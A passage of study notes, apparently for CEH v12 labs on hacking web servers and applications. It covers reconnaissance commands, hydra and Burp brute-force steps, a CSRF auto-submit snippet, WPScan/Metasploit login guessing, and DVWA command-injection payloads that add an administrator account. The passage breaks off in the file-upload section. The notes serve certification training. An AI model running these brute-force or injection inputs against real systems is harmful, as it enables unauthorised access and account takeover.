id="10ebdadd-c4a7-807e-a051-ce2fff7cbfd5" class="toggle"><li><details open=""><summary>Footprint a web server using Netcat and Telnet</summary><p id="126bdadd-c4a7-801f-a4e7-c3b3a088d42b" class="">This is the only way I have found to get an ETag, no other tools work</p><ul id="10fbdadd-c4a7-80a3-8a6b-c1424320ec03" class="bulleted-list"><li style="list-style-type:disc"><code>netcat -vv &lt;website&gt; &lt;port&gt;</code></li></ul><ul id="10fbdadd-c4a7-80c9-a7da-e2ed0d3c9a70" class="bulleted-list"><li style="list-style-type:disc"><code>telnet &lt;website&gt; &lt;port&gt;</code></li></ul><ul id="10fbdadd-c4a7-808f-92ef-d69603f4ec9b" class="bulleted-list"><li style="list-style-type:disc">Then type <code>GET / HTTP/1.0</code> and Enter <code>twice</code></li></ul><ul id="10fbdadd-c4a7-807a-a78b-e3fc3b630b3b" class="bulleted-list"><li style="list-style-type:disc">Will respond back with http response to see the info</li></ul></details></li></ul><ul id="10ebdadd-c4a7-80ca-8470-f586db0ee13a" class="toggle"><li><details open=""><summary>Enumerate web server information using Nmap Scripting Engine (NSE)</summary><ul id="10fbdadd-c4a7-80ca-a2fa-d45166e62284" class="bulleted-list"><li style="list-style-type:disc">Enumerate directories <code><strong>nmap -sV --script=http-enum &lt;target&gt;</strong></code></li></ul><ul id="10fbdadd-c4a7-80cf-a047-f849f63bd867" class="bulleted-list"><li style="list-style-type:disc">Discover host names and resolve domain <code><strong>nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- &lt;target&gt;</strong></code></li></ul><ul id="10fbdadd-c4a7-80b1-b518-d7de51199d5d" class="bulleted-list"><li style="list-style-type:disc">Perform HTTP Trace <code><strong>nmap --script http-trace -d &lt;target&gt;</strong></code></li></ul><ul id="10fbdadd-c4a7-8022-b2a4-cd72e9eb5da7" class="bulleted-list"><li style="list-style-type:disc">Check whether Web Application Firewall is configured on the target host or domain <code><strong>nmap -p80 --script http-waf-detect &lt;target&gt;</strong></code></li></ul></details></li></ul><ul id="10ebdadd-c4a7-80c9-bae5-ed459030764f" class="toggle"><li><details open=""><summary>Uniscan web server fingerprinting in Parrot Security</summary><p id="111bdadd-c4a7-8099-9b01-e0e73c50bab2" class="">Uniscan is a versatile server fingerprinting tool that not only performs simple commands like ping, traceroute, and nslookup, but also does static, dynamic, and stress checks on a web server. </p><p id="111bdadd-c4a7-804d-90d7-f255f68b1c4e" class="">Apart from scanning websites, uniscan also performs automated Bing and Google searches on provided IPs. Uniscan takes all of this data and combines them into a comprehensive report file for the user.</p><p id="111bdadd-c4a7-80c4-bb01-ff60cf964b1a" class="">
</p><ul id="111bdadd-c4a7-8088-8f52-d796bd398eed" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>uniscan -u &lt;target url&gt; -q</strong></code><ul id="111bdadd-c4a7-8029-a7be-db795d675c80" class="bulleted-list"><li style="list-style-type:circle"><code>-u</code> to provide a URL</li></ul><ul id="111bdadd-c4a7-8064-a0f1-c468e1de06b3" class="bulleted-list"><li style="list-style-type:circle"><code>-q</code> to scan directories</li></ul><ul id="111bdadd-c4a7-804f-a5b6-e27f00a1c7af" class="bulleted-list"><li style="list-style-type:circle">Results are in <code>/usr/share/uniscan/results</code> but also seen on screen</li></ul></li></ul><ul id="111bdadd-c4a7-80b2-8a8e-c320f61172e9" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>uniscan -u http://10.10.1.22:8080/CEH -we</strong></code><ul id="111bdadd-c4a7-8024-affd-c9e933775482" class="bulleted-list"><li style="list-style-type:circle"><code>-w</code> runs file checks</li></ul><ul id="111bdadd-c4a7-807d-8e0b-fa1d5218328a" class="bulleted-list"><li style="list-style-type:circle"><code>-e</code> checks for robots.txt and sitemap.xml</li></ul></li></ul><ul id="111bdadd-c4a7-807f-a247-d7f7b90774a8" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>uniscan -u http://10.10.1.22:8080/CEH -d</strong></code><strong> </strong><ul id="111bdadd-c4a7-8094-b1ae-e9ad1db003dd" class="bulleted-list"><li style="list-style-type:circle"><code>-d</code> runs dynamic scan</li></ul><ul id="111bdadd-c4a7-80b5-9a82-d48916682167" class="bulleted-list"><li style="list-style-type:circle"> Obtains information about email-IDs, Source code disclosures, and external hosts, web backdoors</li></ul></li></ul><p id="111bdadd-c4a7-8039-b1ec-dd0dece78252" class="">
</p></details></li></ul></details></li></ul><ul id="111bdadd-c4a7-801c-b8db-e97ed92169d2" class="toggle"><li><details open=""><summary>Crack FTP Credentials using Dictionary Attack</summary><ul id="111bdadd-c4a7-809b-b0ac-e00336919caa" class="bulleted-list"><li style="list-style-type:disc">Check if FTP is enabled on web server<ul id="111bdadd-c4a7-8056-8a12-e553241f01dd" class="bulleted-list"><li style="list-style-type:circle"><code>nmap -p21 &lt;target&gt;</code></li></ul></li></ul><ul id="111bdadd-c4a7-80e5-b3e4-de15c4357acf" class="bulleted-list"><li style="list-style-type:disc">Copy wordlist from <code><strong>CEHv12 Module 13 Hacking Web Servers\Wordlists</strong></code><strong> </strong>to Desktop</li></ul><ul id="111bdadd-c4a7-8092-af53-ccc7f4db3b16" class="bulleted-list"><li style="list-style-type:disc"><strong>Run </strong><code><strong>hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://&lt;target&gt;</strong></code></li></ul></details></li></ul></details></li></ul><ul id="111bdadd-c4a7-8051-b230-e755d1fda5b5" class="toggle"><li><details open=""><summary>Lab 13 - Hacking Web Applications</summary><ul id="114bdadd-c4a7-80f0-ab8c-e1c1e21d538d" class="toggle"><li><details open=""><summary>Footprint the web infrastructure</summary><ul id="114bdadd-c4a7-8092-a600-e0531d7035a2" class="toggle"><li><details open=""><summary><strong>Overview of Footprinting the Web Infrastructure</strong></summary><p id="114bdadd-c4a7-802b-ac1a-e500cdeee828" class="">Footprinting the web infrastructure allows attackers to engage in the following tasks:</p><ul id="114bdadd-c4a7-8008-99cd-c17a447a6d4b" class="bulleted-list"><li style="list-style-type:disc"><strong>Server Discovery</strong>: Attackers attempt to discover the physical servers that host a web application using techniques such as Whois Lookup, DNS Interrogation, and Port Scanning</li></ul><ul id="114bdadd-c4a7-8074-a631-e1a7e5c251da" class="bulleted-list"><li style="list-style-type:disc"><strong>Service Discovery</strong>: Attackers discover services running on web servers to determine whether they can use some of them as attack paths for hacking a web app</li></ul><ul id="114bdadd-c4a7-80b1-9d51-e0b4a5535c8e" class="bulleted-list"><li style="list-style-type:disc"><strong>Server Identification</strong>: Attackers use banner-grabbing to obtain server banners; this helps to identify the make and version of the web server software</li></ul><ul id="114bdadd-c4a7-80bc-811f-e9e01ef28af8" class="bulleted-list"><li style="list-style-type:disc"><strong>Hidden Content Discovery</strong>: Footprinting also allows attackers to extract content and functionality that is not directly linked to or reachable from the main visible content</li></ul></details></li></ul><p id="114bdadd-c4a7-809c-8599-e6108ca992e0" class="">
</p><ul id="114bdadd-c4a7-8095-9af2-cb61ad2ce99c" class="toggle"><li><details open=""><summary>Perform web application reconnaissance using Nmap and Telnet</summary><ul id="114bdadd-c4a7-80b4-9970-dd0291d7762f" class="bulleted-list"><li style="list-style-type:disc">Perform a <code>Whois lookup</code><p id="114bdadd-c4a7-80aa-8f76-fc29e2357152" class="">So that we gather information about the IP address of the web server</p><p id="114bdadd-c4a7-80d6-bc9f-c605ce895aad" class="">And the complete information about the domain such as its registration details, name servers, IP address, and location.</p><ul id="114bdadd-c4a7-80c5-8253-ec41bbd246b2" class="toggle"><li><details open=""><summary>Tools</summary><ul id="114bdadd-c4a7-80c9-8dfd-dfb567ab539a" class="bulleted-list"><li style="list-style-type:disc"><strong>Netcraft</strong> (netcraft.com),</li></ul><ul id="114bdadd-c4a7-8069-81c3-caa72b87211e" class="bulleted-list"><li style="list-style-type:disc"><strong>SmartWhois</strong> (tamos.com)</li></ul><ul id="114bdadd-c4a7-803d-95fb-f2b64cfc3a84" class="bulleted-list"><li style="list-style-type:disc"><strong>WHOIS Lookup</strong> (whois.domaintools.com)</li></ul><ul id="114bdadd-c4a7-8069-954f-e568b3696032" class="bulleted-list"><li style="list-style-type:disc"><strong>Batch</strong> <strong>IP Converter</strong> (sabsoft.com)<br/><br/><br/></li></ul></details></li></ul></li></ul><ul id="114bdadd-c4a7-8055-a210-f7dd69fca436" class="bulleted-list"><li style="list-style-type:disc">Perform <code>DNS Interrogation</code><p id="114bdadd-c4a7-80a3-ae3d-da082893b4d4" class="">To gather information about the DNS servers, DNS records</p><p id="114bdadd-c4a7-80ec-92a0-d272f8cedb64" class="">Types of servers used by the target organization. </p><p id="114bdadd-c4a7-8038-b6f6-c6385275bb27" class="">DNS zone data include DNS domain names, computer names, IP addresses, domain mail servers, service records, etc.</p><ul id="114bdadd-c4a7-800a-b78e-e9f6dc152061" class="toggle"><li><details open=""><summary>Tools</summary><ul id="114bdadd-c4a7-8090-a9c4-d0c2c61ed8b7" class="bulleted-list"><li style="list-style-type:disc"><strong>DNSRecon</strong> (github.com)</li></ul><ul id="114bdadd-c4a7-80a9-880d-d338cbcd096d" class="bulleted-list"><li style="list-style-type:disc"><strong>DNS Records</strong> (network-tools.com)</li></ul><ul id="114bdadd-c4a7-80ac-83f0-e10b5d110eaa" class="bulleted-list"><li style="list-style-type:disc"><strong>Domain Dossier</strong> (centralops.net)<br/><br/><br/></li></ul></details></li></ul></li></ul><ul id="114bdadd-c4a7-8060-9bf3-e480c459ac19" class="bulleted-list"><li style="list-style-type:disc">Perform <code>Port Scanning</code><p id="114bdadd-c4a7-808c-a138-f81c86ded791" class="">To gather info about ports and services and </p><p id="114bdadd-c4a7-8032-9039-c3f8e8926b8e" class="">You can identify target machine name, NetBIOS name, DNS name, MAC address, OS, etc.</p><ul id="114bdadd-c4a7-8048-89db-c2340a386193" class="bulleted-list"><li style="list-style-type:circle">Run <code><strong>nmap -T4 -A -v &lt;target&gt;</strong></code></li></ul></li></ul><ul id="114bdadd-c4a7-8074-a029-c38696e4b506" class="bulleted-list"><li style="list-style-type:disc">Perform <code>Banner grabbing</code><ul id="114bdadd-c4a7-807f-a433-d71a4a7bfc9f" class="bulleted-list"><li style="list-style-type:circle">Run <code>telnet &lt;target&gt; &lt;port&gt;</code></li></ul><ul id="114bdadd-c4a7-804d-8751-c4049e93c99f" class="bulleted-list"><li style="list-style-type:circle">In this example we run on port 80 and typed <code><strong>GET / HTTP/1.0</strong></code></li></ul><ul id="114bdadd-c4a7-80d4-b0dd-ead4ea5547bc" class="bulleted-list"><li style="list-style-type:circle">From the request we found that the server is IIS and the technology is ASP.NET</li></ul></li></ul><p id="114bdadd-c4a7-8094-a06f-face8aac540d" class="">
</p></details></li></ul><ul id="114bdadd-c4a7-80c1-9aad-f18bdc43f33f" class="toggle"><li><details open=""><summary>Perform web application reconnaissance using WhatWeb</summary><p id="114bdadd-c4a7-80fb-b2c1-c9c17ce13822" class="">WhatWeb identifies websites and recognizes web technologies, including content management systems (CMS), blogging platforms, statistics and analytics packages, JavaScript libraries, web servers, and embedded devices</p><p id="114bdadd-c4a7-80de-992a-cfb5aa59fcc4" class="">It also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.</p><ul id="114bdadd-c4a7-80da-82ba-ce60ac4f1d37" class="bulleted-list"><li style="list-style-type:disc">Run <code>whatweb -v &lt;target&gt;</code><ul id="114bdadd-c4a7-8005-8e95-ec9fe71e6f17" class="bulleted-list"><li style="list-style-type:circle">Its an easy tool to quickly find info</li></ul><ul id="114bdadd-c4a7-8047-bfba-cf97f0464368" class="bulleted-list"><li style="list-style-type:circle">can use <code>--log-verbose=&lt;report_name&gt;</code> to output a text report</li></ul></li></ul></details></li></ul><ul id="114bdadd-c4a7-8086-952d-ed90a7bbbc8f" class="toggle"><li><details open=""><summary>Perform web spidering using OWASP ZAP</summary><p id="115bdadd-c4a7-8022-852d-d09709eb1515" class="">This is different than directory brute forcing because it tries to use google to find links and follows links of the page instead of using a wordlist</p><ul id="114bdadd-c4a7-805a-a5af-f0a88485309d" class="bulleted-list"><li style="list-style-type:disc">Start OWASP ZAP by typing <code>zaproxy</code></li></ul><ul id="115bdadd-c4a7-800e-899b-db3d1c16eae4" class="bulleted-list"><li style="list-style-type:disc">Click the big <code>Automated Scan</code> button</li></ul><ul id="115bdadd-c4a7-80b3-ba64-e948d64a722a" class="bulleted-list"><li style="list-style-type:disc">Type in the website and press <code>Attack</code></li></ul><ul id="115bdadd-c4a7-80c1-bf7f-f92c41bf3594" class="bulleted-list"><li style="list-style-type:disc">In the <code>Alerts</code> tab you can see various issues and vulenrabilities</li></ul><ul id="115bdadd-c4a7-80cc-aac4-f4afa80a0ff3" class="bulleted-list"><li style="list-style-type:disc">In the <code>Spider</code> tab you can see</li></ul></details></li></ul><ul id="114bdadd-c4a7-808b-9509-c3e3184068c0" class="toggle"><li><details open=""><summary>Detect load balancers using various tools</summary><ul id="115bdadd-c4a7-8013-87d3-d84caf534657" class="bulleted-list"><li style="list-style-type:disc">Run <code>dig &lt;website&gt;</code> to see if there are any network load balancers from DNS</li></ul><ul id="115bdadd-c4a7-801a-a1d0-f1fb6995c41c" class="bulleted-list"><li style="list-style-type:disc">Run <code>lbd &lt;website&gt;</code> to use Load Balancer Detector<ul id="115bdadd-c4a7-80ec-ba5e-e89e92df7fdc" class="bulleted-list"><li style="list-style-type:circle">it smartly recognizes the load balancer through<ul id="115bdadd-c4a7-8087-87ce-f08e9b6595f6" class="bulleted-list"><li style="list-style-type:square">DNS and http load balancing</li></ul><ul id="115bdadd-c4a7-80a0-875e-d5539f46cb60" class="bulleted-list"><li style="list-style-type:square">Date: headers and the differences between server answers. </li></ul></li></ul></li></ul></details></li></ul><ul id="114bdadd-c4a7-80e9-8b21-e03e985c9265" class="toggle"><li><details open=""><summary>Identify web server directories using various tools</summary><ul id="115bdadd-c4a7-80cc-8b0a-d17be82976e4" class="bulleted-list"><li style="list-style-type:disc">Run directory, file and application enumeration through nmap<ul id="115bdadd-c4a7-800d-b9ec-edf7e04822c3" class="bulleted-list"><li style="list-style-type:circle"><code><strong>nmap -sV --script=http-enum &lt;target&gt;</strong></code></li></ul></li></ul><ul id="115bdadd-c4a7-809e-ad87-ede80f2517eb" class="bulleted-list"><li style="list-style-type:disc">Brute force directories using gobuster<ul id="115bdadd-c4a7-8098-b85b-c3585c37180f" class="bulleted-list"><li style="list-style-type:circle"><code><strong>gobuster dir -u &lt;website&gt; -w &lt;wordlist&gt;</strong></code></li></ul></li></ul><ul id="115bdadd-c4a7-8044-bf44-db57c53e861e" class="bulleted-list"><li style="list-style-type:disc">Bruteforce directories using <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><ul id="115bdadd-c4a7-80d9-8617-c9a2c61dbf01" class="bulleted-list"><li style="list-style-type:circle"><code><strong>python3 dirsearch.py -u &lt;target&gt;</strong></code><ul id="115bdadd-c4a7-8086-9d36-deec20f85ece" class="bulleted-list"><li style="list-style-type:square">use <code>-e</code> to search for a specific extension (eg -e aspx)</li></ul><ul id="115bdadd-c4a7-808b-9963-eed59b76c43b" class="bulleted-list"><li style="list-style-type:square">use <code>-x</code> to exclude return codes (eg -x 403)</li></ul></li></ul></li></ul></details></li></ul><ul id="114bdadd-c4a7-8081-9c41-c20621ca434d" class="toggle"><li><details open=""><summary>Perform web application vulnerability scanning using Vega</summary><p id="115bdadd-c4a7-80d4-b488-dd4df9379637" class="">Vega is a web application scanner used to test the security of web applications.</p><p id="115bdadd-c4a7-8097-b2a3-c2bd23717dc2" class="">It helps you to find and validate SQL Injection, XSS, inadvertently disclosed sensitive information, and other vulnerabilities.</p><p id="115bdadd-c4a7-80a0-8bf1-cd4336ad1858" class="">
</p><ul id="115bdadd-c4a7-805e-bf7b-f2b733bce89a" class="bulleted-list"><li style="list-style-type:disc">Run <a href="https://subgraph.com/vega/">https://subgraph.com/vega/</a> as administrator</li></ul><ul id="115bdadd-c4a7-808f-8eeb-d5e63bd02237" class="bulleted-list"><li style="list-style-type:disc">Go to <code>Scan -&gt; Start New Scan</code></li></ul><ul id="115bdadd-c4a7-8052-bfce-e74584fbef0e" class="bulleted-list"><li style="list-style-type:disc">Enter the website URL</li></ul><ul id="115bdadd-c4a7-80b5-9c2d-fe7e77c7f6bf" class="bulleted-list"><li style="list-style-type:disc">Click <code>Finish</code></li></ul><ul id="115bdadd-c4a7-8079-a2f8-e5b5d6a3cee5" class="bulleted-list"><li style="list-style-type:disc">It will scan and show results on the <code>Scan Aerts</code> left-hand pane</li></ul><ul id="115bdadd-c4a7-8093-812c-cc169ea30492" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="115bdadd-c4a7-807f-ad91-d96619f98482" class="bulleted-list"><li style="list-style-type:disc"><strong>WPScan Vulnerability Database</strong> (wpscan.com)</li></ul><ul id="115bdadd-c4a7-807b-8bfd-d2b58bde742e" class="bulleted-list"><li style="list-style-type:disc"><strong>Arachni</strong> (arachni-scanner.com)</li></ul><ul id="115bdadd-c4a7-808f-a9d8-ed84f4e5c533" class="bulleted-list"><li style="list-style-type:disc"><strong>appspider</strong> (rapid7.com)</li></ul><ul id="115bdadd-c4a7-80cb-b635-ece5c6fabe34" class="bulleted-list"><li style="list-style-type:disc"><strong>Uniscan</strong> (sourceforge.net)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="114bdadd-c4a7-8017-9183-d8c30331bdc3" class="toggle"><li><details open=""><summary>Identify clickjacking vulnerability using ClickjackPoc</summary><p id="115bdadd-c4a7-80a8-9870-f37ad89a2507" class="">Clickjacking, also known as a “UI redress attack,” occurs when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they intend to click on the top-level page. </p><p id="115bdadd-c4a7-80b2-b150-d1409c3418a0" class="">Thus, the attacker is “hijacking” clicks meant for the top-level page and routing them to another page, most likely owned by another application, domain, or both.</p><ul id="115bdadd-c4a7-80d7-bc82-d0c35252645b" class="bulleted-list"><li style="list-style-type:disc">Using <a href="https://github.com/Raiders0786/ClickjackPoc">https://github.com/Raiders0786/ClickjackPoc</a></li></ul><ul id="115bdadd-c4a7-80ca-a0c8-dfe15c9668d0" class="bulleted-list"><li style="list-style-type:disc">What it does is identify if the website is vulnerable to clickjacking</li></ul><ul id="115bdadd-c4a7-80b2-8ab1-ec2ca2558089" class="bulleted-list"><li style="list-style-type:disc">How to use<ul id="115bdadd-c4a7-8053-ac58-c00fb8e1d18c" class="bulleted-list"><li style="list-style-type:circle">Write the website you want to test inside <code>domain.txt</code></li></ul><ul id="115bdadd-c4a7-8080-9664-d2e730795a7e" class="bulleted-list"><li style="list-style-type:circle">Run <code><strong>python3 clickJackPoc.py -f domain.txt</strong></code></li></ul><ul id="115bdadd-c4a7-80c7-a1b8-f7aa7a5d73e2" class="bulleted-list"><li style="list-style-type:circle">It saves it as an html file under a folder  with the website’s name inside the clickJackPoc directory</li></ul></li></ul></details></li></ul></details></li></ul><ul id="114bdadd-c4a7-80f3-9ed5-ffdb264232e3" class="toggle"><li><details open=""><summary>Perform web application attacks</summary><ul id="114bdadd-c4a7-8059-8b3e-e1fe68d6cee3" class="toggle"><li><details open=""><summary>Perform a brute-force attack using Burp Suite</summary><ul id="115bdadd-c4a7-809b-998e-e05b392074d3" class="bulleted-list"><li style="list-style-type:disc">Open <code>Burp Suite</code></li></ul><ul id="115bdadd-c4a7-80ea-bd79-d8978a790418" class="bulleted-list"><li style="list-style-type:disc">Set up the proxy to <code>127.0.0.1</code> and <code>8080</code></li></ul><ul id="115bdadd-c4a7-80ba-9bf5-e3881902c484" class="bulleted-list"><li style="list-style-type:disc">Capture a request with a login form</li></ul><ul id="115bdadd-c4a7-80a8-9a4f-fea040b40148" class="bulleted-list"><li style="list-style-type:disc">Find it in proxy</li></ul><ul id="115bdadd-c4a7-801c-a022-d399aefd6514" class="bulleted-list"><li style="list-style-type:disc">Click <code>Actions -&gt; Send to Intruder</code></li></ul><ul id="115bdadd-c4a7-80e4-8acd-cb43517117af" class="bulleted-list"><li style="list-style-type:disc">Go to the <code>Intruder</code></li></ul><ul id="115bdadd-c4a7-80bd-9c1a-cb955b7f0a91" class="bulleted-list"><li style="list-style-type:disc">Click <code>Clear $</code></li></ul><ul id="115bdadd-c4a7-80d9-af48-f9cb2b05a9b4" class="bulleted-list"><li style="list-style-type:disc">Highlight the <code>username</code> field in the request and click <code>Add $</code></li></ul><ul id="115bdadd-c4a7-8061-aef5-dc72f14703ea" class="bulleted-list"><li style="list-style-type:disc">Highlight the <code>password</code> field in the request and click <code>Add $</code></li></ul><ul id="115bdadd-c4a7-80e6-871e-d57ccd21e786" class="bulleted-list"><li style="list-style-type:disc">Go to <code>Payloads</code> tab</li></ul><ul id="115bdadd-c4a7-805e-a6cb-c8d589b3c846" class="bulleted-list"><li style="list-style-type:disc">Select <code>Payload set</code> to 1 (for the first field, here is username)</li></ul><ul id="115bdadd-c4a7-8032-aaed-cc12e592b574" class="bulleted-list"><li style="list-style-type:disc">Load a dictionary</li></ul><ul id="115bdadd-c4a7-80a5-9848-de67813947e0" class="bulleted-list"><li style="list-style-type:disc">Select <code>Payload set</code> to 2 (for the second field, here is password)</li></ul><ul id="115bdadd-c4a7-8069-8cc8-e1ca26c4dd23" class="bulleted-list"><li style="list-style-type:disc">Load a dictionary</li></ul><ul id="115bdadd-c4a7-80c1-8d42-e1987269b5f6" class="bulleted-list"><li style="list-style-type:disc">Click <code>Start attack</code></li></ul><ul id="115bdadd-c4a7-8085-aab1-d0fe8c7d7d37" class="bulleted-list"><li style="list-style-type:disc">The request with a different response code is the successful one</li></ul></details></li></ul><ul id="114bdadd-c4a7-804d-8fb7-c3541b9cbdcc" class="toggle"><li><details open=""><summary>Perform GET parameter tampering using Burp Suite</summary><ul id="115bdadd-c4a7-80bb-acd0-eae68e72bd6f" class="bulleted-list"><li style="list-style-type:disc">Open Burp Suite just like in the previous task</li></ul><ul id="115bdadd-c4a7-809b-8e83-cb06c3548e97" class="bulleted-list"><li style="list-style-type:disc">Intercept a request that has GET parameters</li></ul><ul id="115bdadd-c4a7-80ee-b3ba-d0b2c4ed2a26" class="bulleted-list"><li style="list-style-type:disc">Click on the inspector on the right hand side</li></ul><ul id="115bdadd-c4a7-8047-b415-ea65137f03f7" class="bulleted-list"><li style="list-style-type:disc">Expand parameters, change them and apply</li></ul></details></li></ul><ul id="114bdadd-c4a7-805f-80b3-e0c933cb5a0a" class="toggle"><li><details open=""><summary>Identify XSS vulnerabilities in web applications using PwnXSS</summary><ul id="119bdadd-c4a7-800e-9fe8-dd70c0b7e01a" class="bulleted-list"><li style="list-style-type:disc">Using <a href="https://github.com/pwn0sec/PwnXSS">https://github.com/pwn0sec/PwnXSS</a></li></ul><ul id="119bdadd-c4a7-806f-a56c-fb1027149752" class="bulleted-list"><li style="list-style-type:disc">Uses multiple methods and finds paramteres to exploit</li></ul><ul id="119bdadd-c4a7-8027-9131-c96bb1cd1328" class="bulleted-list"><li style="list-style-type:disc">Run <code>python3 </code><code><a href="http://pwnxss.py">pwnxss.py</a></code><code> -u &lt;web target&gt;</code></li></ul></details></li></ul><ul id="114bdadd-c4a7-80ef-afc8-e5a42bf939e8" class="toggle"><li><details open=""><summary>Exploit parameter tampering and XSS vulnerabilities in web applications</summary><ul id="119bdadd-c4a7-808e-8416-cabe9f4061a6" class="bulleted-list"><li style="list-style-type:disc">They showcased using forms and GET parameters and playing with them manually</li></ul><ul id="119bdadd-c4a7-80e0-96b9-d232e3fa7d9b" class="bulleted-list"><li style="list-style-type:disc">They also showed a stored xss through comment parameter</li></ul></details></li></ul><ul id="114bdadd-c4a7-80d1-8551-c5a8446199f7" class="toggle"><li><details open=""><summary>Perform cross-site request forgery (CSRF) attack</summary><p id="119bdadd-c4a7-800d-bc1b-d4037e8245f3" class="">We set up a vulnerable wordpress plugin</p><p id="119bdadd-c4a7-8002-adb6-cfb445bed0a4" class="">Scanned using wpscan and applied CSRF</p><p id="119bdadd-c4a7-80ff-b9a8-d8aa7171dd77" class="">CSRF vulnerability is the ability to craft or modify requests in a page</p><ul id="119bdadd-c4a7-80bc-9c2b-df0deddd62e7" class="bulleted-list"><li style="list-style-type:disc">Using wpscan<ul id="119bdadd-c4a7-8006-a030-d57509cac1c3" class="bulleted-list"><li style="list-style-type:circle">Create an account and get an API key from <strong>https://wpscan.com/register</strong></li></ul><ul id="119bdadd-c4a7-8077-bb3b-c4e786f37793" class="bulleted-list"><li style="list-style-type:circle">Run <code><strong>wpscan --api-token &lt;token&gt; --url &lt;target&gt; --plugins-detection aggressive --enumerate vp</strong></code></li></ul></li></ul><ul id="119bdadd-c4a7-8089-b9ac-c4ffddae2044" class="bulleted-list"><li style="list-style-type:disc">After you find vulnerable plugins, just do CSRF using burp suite</li></ul><ul id="119bdadd-c4a7-801b-ac30-cb08158dd159" class="bulleted-list"><li style="list-style-type:disc">In the example they showed an interesting way to perform this attack<ul id="119bdadd-c4a7-80bb-8a74-cd8dec60a1c3" class="bulleted-list"><li style="list-style-type:circle">They created an html file that has a form with post link to the vulnerable url</li></ul><ul id="119bdadd-c4a7-809b-943d-fad0a8e9c98c" class="bulleted-list"><li style="list-style-type:circle">and a  javascript <code>onload=document.forms[’CSRF’].submit()</code> inside body</li></ul></li></ul></details></li></ul><ul id="114bdadd-c4a7-80cf-b2b4-de7e97d1df6d" class="toggle"><li><details open=""><summary>Enumerate and hack a web application using WPScan and Metasploit</summary><ul id="119bdadd-c4a7-8023-8ffc-e824b00f31c0" class="bulleted-list"><li style="list-style-type:disc">Use wpscan to enumerate usernames<ul id="119bdadd-c4a7-808f-b9ab-c73bd4d2e1b6" class="bulleted-list"><li style="list-style-type:circle">Run <code><strong>wpscan --api-token &lt;token&gt; --url &lt;target&gt; --enumerate u</strong></code></li></ul></li></ul><ul id="119bdadd-c4a7-80fa-b7f9-f11c8d338300" class="bulleted-list"><li style="list-style-type:disc">Use metasploit to bruteforce passwords for found usernames<ul id="119bdadd-c4a7-80c9-902e-df378e407087" class="bulleted-list"><li style="list-style-type:circle"><code>service postgresql start</code></li></ul><ul id="119bdadd-c4a7-800e-8069-c323681c8686" class="bulleted-list"><li style="list-style-type:circle"><code>msfconsole</code></li></ul><ul id="119bdadd-c4a7-8093-8904-ee4006be4a72" class="bulleted-list"><li style="list-style-type:circle"><code>use </code><code><strong>auxiliary/scanner/http/wordpress_login_enum</strong></code></li></ul><ul id="119bdadd-c4a7-8090-ad84-c51956dbdbed" class="bulleted-list"><li style="list-style-type:circle">Set options<ul id="119bdadd-c4a7-8077-bab8-da1000ab27f3" class="bulleted-list"><li style="list-style-type:square">PASS_FILE, RHOST, RPORT, TARGETURI, USERNAME</li></ul></li></ul></li></ul></details></li></ul><ul id="114bdadd-c4a7-805a-ab80-d18dfbf5a349" class="toggle"><li><details open=""><summary>Exploit a remote command execution vulnerability to compromise a target web server</summary><ul id="119bdadd-c4a7-80d3-b4cd-d8f32af74b13" class="bulleted-list"><li style="list-style-type:disc">Used DVWA to example OS Command injection</li></ul><ul id="119bdadd-c4a7-8053-b276-fb4e0609f6b3" class="bulleted-list"><li style="list-style-type:disc">Useful commands used:<ul id="119bdadd-c4a7-805a-9a3e-fe54e48016e7" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| hostname</strong></code><strong> :  to probe the hostname of the target machine.</strong></li></ul><ul id="119bdadd-c4a7-80dc-ab00-c7c4851d343a" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| whoami</strong></code><strong> : displays the user, group, and privileges information for the user</strong></li></ul><ul id="119bdadd-c4a7-80ec-81b3-ef02919b1402" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| tasklist</strong></code><strong> : view the processes running on the machine</strong></li></ul><ul id="119bdadd-c4a7-80d6-b177-f4290b0b009a" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| Taskkill /PID &lt;pid&gt; /F</strong></code><strong> : forcefully terminate a process</strong></li></ul><ul id="119bdadd-c4a7-80f2-adc9-e92221f35645" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| dir C:\</strong></code><strong> : view the files and directories on the C:\ drive</strong></li></ul><ul id="119bdadd-c4a7-80dd-a8c1-d3d6a7954c25" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| net user</strong></code><strong> : To view user account information</strong></li></ul><ul id="119bdadd-c4a7-80b4-b88e-c7588ba9c337" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| net user Test /Add</strong></code><strong> : Create an account named Test</strong></li></ul><ul id="119bdadd-c4a7-80ca-809a-d227affdba79" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| net user</strong></code><strong> :  view the user accounts</strong></li></ul><ul id="119bdadd-c4a7-80f8-8292-d11e2f623a22" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| net user Test</strong></code><strong> :  view the new account’s information</strong></li></ul><ul id="119bdadd-c4a7-803a-a741-f7e040bc19c4" class="bulleted-list"><li style="list-style-type:circle"><code><strong>| net localgroup Administrators Test /Add</strong></code><strong> : grant administrative privileges</strong></li></ul></li></ul><ul id="119bdadd-c4a7-8017-afeb-cb7ac5fd0d92" class="bulleted-list"><li style="list-style-type:disc">Crack passwords: <a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></li></ul></details></li></ul><ul id="114bdadd-c4a7-803f-bcb6-c6d834f96dd7" class="toggle"><li><details open=""><summary>Exploit a file upload vulnerability at different security levels</summary><p id="119bdadd-c4a7-805f-96fd-cb8882ebbc92" class="">We used 3 different approaches for 3 different security levels of DVWA</p><ul id="119bdadd-c4a7-8021-90c1-e8f26af905f9" class="toggle"><li><details open=""><summary>Low: No security</summary><ul id="119bdadd-c4a7-8077-a2d7-d050f311d83a" class="bulleted-list"><li 